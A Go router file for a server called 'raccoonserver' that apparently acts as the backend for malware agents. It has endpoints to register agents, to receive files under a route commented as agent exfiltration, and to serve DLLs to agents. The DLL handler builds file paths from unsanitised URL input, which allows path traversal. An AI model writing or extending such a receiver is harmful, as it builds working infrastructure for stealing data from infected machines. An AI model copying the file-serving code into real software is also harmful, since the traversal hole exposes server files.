package routers

import (
	"io"
	"os"
	"raccoonserver/configs"
	"raccoonserver/controllers"
	"raccoonserver/middleware"

	"github.com/gin-gonic/gin"
)

// SetupRouter creates and returns a new gin.Engine with the API endpoints and their handlers
func SetupRouter(config *configs.ServerConfig) *gin.Engine {
	// Initialize and configure new gin router
	gin.SetMode(gin.ReleaseMode)
	logFile, _ := os.OpenFile("raccoon.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	gin.DefaultWriter = io.MultiWriter(logFile)
	r := gin.New()
	r.Use(gin.Logger())
	r.Use(gin.Recovery())

	// Raise the memory limit for multipart forms, to exceed the config
	r.MaxMultipartMemory = 55 << 20 // 55Mib

	// Initialize agent controller
	agentController := controllers.NewAgentController()

	// Auth middleware route
	authRoutes := r.Group("/:token", middleware.Authenticator())
	{
		// Handle serving the static dll's
		authRoutes.GET("/*filepath", func(c *gin.Context) {
			filePath := c.Param("filepath")
			c.File("../3rdPartyDLLs/" + filePath)
		})

		// Handle agent exfil
		authRoutes.POST("/", middleware.LogAgentUpload(logFile), agentController.RecieveFile)
	}

	// Handle root requests
	r.POST("/", middleware.ValidateRegistration(config), middleware.LogAgentRegistration(logFile), agentController.RegisterAgent) // No reason to pass the config currently but it feels like good practice.
	return r
}
